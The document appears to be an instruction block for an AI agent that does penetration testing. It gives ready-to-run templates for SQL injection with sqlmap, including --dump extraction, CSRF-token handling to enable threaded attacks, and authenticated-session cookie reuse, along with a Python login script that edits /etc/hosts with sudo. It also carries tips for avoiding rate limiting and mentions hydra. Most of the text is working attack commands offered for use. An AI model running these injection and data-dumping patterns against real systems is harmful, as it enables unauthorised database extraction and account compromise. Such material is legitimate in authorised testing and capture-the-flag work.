--- SESSION (any task involving login or cookies) ---
CRITICAL: For ANY task involving login + CSRF token, use Python requests.Session() — NOT curl.
requests.Session() shares cookies automatically across all requests.
curl requires manual cookie file passing and is error-prone for multi-step auth.

Python login template (always use this for login tasks):
    #!/usr/bin/env python3
    import requests, re, subprocess
    subprocess.run(["sudo","tee","-a","/etc/hosts"], input=b"IP HOSTNAME\n", capture_output=True)
    s = requests.Session()
    r = s.get("http://target/login")
    token = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
    token = token.group(1) if token else ""
    r2 = s.post("http://target/login", data={"username": "admin", "password": "pass", "_token": token})
    print(r2.status_code, r2.url)  # 302 + dashboard URL = success

--- SQL INJECTION ---
Target a specific known endpoint and parameter — do NOT use --forms (too slow, scans the whole app).
Pick ONE of these patterns depending on whether the target uses POST or GET:
    # POST example:
    COOK=/tmp/plante_session.txt
    sqlmap -u "http://target/endpoint" --data "email=x&submit=1" -p email \
           --flush-session --batch --level=2 | cat
    # GET example:
    sqlmap -u "http://target/endpoint?id=1" -p id --flush-session --batch --level=2 --dump | cat
If sqlmap returns "not injectable" and you suspect input validation is filtering payloads
(e.g. email format check causes 500 on all payloads), escalate: add --level=3 --risk=2

If the form has a CSRF token, do NOT use --csrf-url (it forces a new session per request,
breaking boolean detection — sqlmap falls back to slow time-based). Use the SPEED pattern
below instead (pre-fetch session cookie + token, pass via --cookie and --threads=5).

If the endpoint requires an authenticated session (e.g. inside admin panel after login),
also extract the session cookie from $COOK and pass it via --cookie.
Adapt the cookie name to match the framework (laravel_session, PHPSESSID, etc.).
Example (authenticated session, no CSRF token):
    COOK=/tmp/plante_session.txt
    SESSION=$(grep 'laravel_session' $COOK | awk '{print $NF}' || true)
    sqlmap -u "http://target/endpoint" --data "param=x" -p param \
           --cookie="laravel_session=$SESSION" \
           --flush-session --batch --level=2 | cat

SPEED — pre-fetch session to enable --threads (avoids --csrf-url conflict):
--csrf-url is incompatible with --threads. To use multi-threading on a CSRF-protected form,
pre-fetch the session cookie + token once, then pass them statically. Laravel CSRF tokens
are session-bound and stay valid for the entire session (~2 hours), so one fetch is enough.
ALWAYS use this pattern when you need speed (extraction, --dump, repeated sqlmap calls):
    COOK=/tmp/plante_session.txt
    PAGE=$(curl -s -c $COOK -b $COOK "http://target/form-page")
    TOKEN=$(echo "$PAGE" | tr "'" '"' | grep -o 'name="_token"[^>]*>' | grep -o 'value="[^"]*"' | cut -d'"' -f2 || true)
    SESSION=$(grep 'laravel_session' $COOK | awk '{print $NF}' || true)
# NOTE: TOKEN comes from $PAGE (HTML response). SESSION comes from $COOK (cookie file).
# NEVER do cat $COOK to get TOKEN — the cookie file does not contain the _token form field.
    sqlmap -u "http://target/endpoint" \
           --data "email=x@x.com&_token=$TOKEN" -p email \
           --cookie="laravel_session=$SESSION" \
           --batch --level=3 --risk=2 \
           --threads=2 --dump | cat
This is faster than --csrf-url and avoids triggering server rate limits.
If the server returns 500 errors or timeouts, add --delay=1 to slow down further.
NOTE: Do NOT add --flush-session to extraction/dump tasks. Only use --flush-session on the
very first detection run. Re-detecting from scratch every turn hammers the server and
triggers rate limiting. Reuse the cached injection type from previous sqlmap runs.

--- SUCCESS DETECTION ---
Check HTTP code after a login POST:
    CODE=$(curl -s -o /dev/null -w "%{http_code}" -b $COOK -c $COOK -X POST <url> -d "<data>")

--- NEVER ---
- NEVER use set -e (grep returns exit 1 on no match, which kills the script)
- NEVER use grep -P or grep -oP (Perl regex mode is unreliable on Kali)
- NEVER use \K in grep patterns — \K is Perl-only, requires -P, will silently produce empty output
- NEVER use Python with multi-line heredocs (they break on remote execution); python3 one-liners with -c are fine
- NEVER redirect output to files (no > file.txt) -- stdout only
- For account/profile/IDOR pages: print the FULL response body so all fields are visible
- For large pages (homepage, CSS): store in variable and grep only what matters
- Always pipe interactive tools through | cat:  sqlmap ... | cat  /  hydra ... | cat
- NEVER pipe sqlmap through | head — SIGPIPE kills sqlmap before results are extracted
- NEVER use --threads with --csrf-url — sqlmap will throw a CRITICAL error and abort
- NEVER specify --technique=T alone — this forces time-based only (30-60 min per dump).
  Omit --technique entirely: sqlmap auto-tries all (boolean first, time-based as fallback).
  If you must restrict: use --technique=BET (boolean+error+time), never T alone.
